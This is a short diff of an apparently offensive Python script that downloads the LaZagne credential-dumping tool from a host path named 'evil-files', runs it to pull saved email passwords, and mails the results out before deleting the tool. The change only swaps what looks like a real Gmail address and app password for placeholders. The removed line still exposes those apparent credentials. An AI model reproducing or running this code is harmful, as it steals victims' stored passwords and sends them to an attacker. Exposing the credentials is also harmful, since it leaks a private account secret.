@@ -19,6 +19,6 @@ temp_directory = tempfile.gettempdir()
 os
 download("http://192.168.188.135/evil-files/laZagne_x86.exe")
 result = subprocess.check_output("laZagne_x86.exe mails", shell=True)
-send_mail("szymon.londka@gmail.com", "tufxtmigajgjxqsv", result)
+send_mail("xyz", "xyz", result)
 os.remove("laZagne_x86.exe")
 
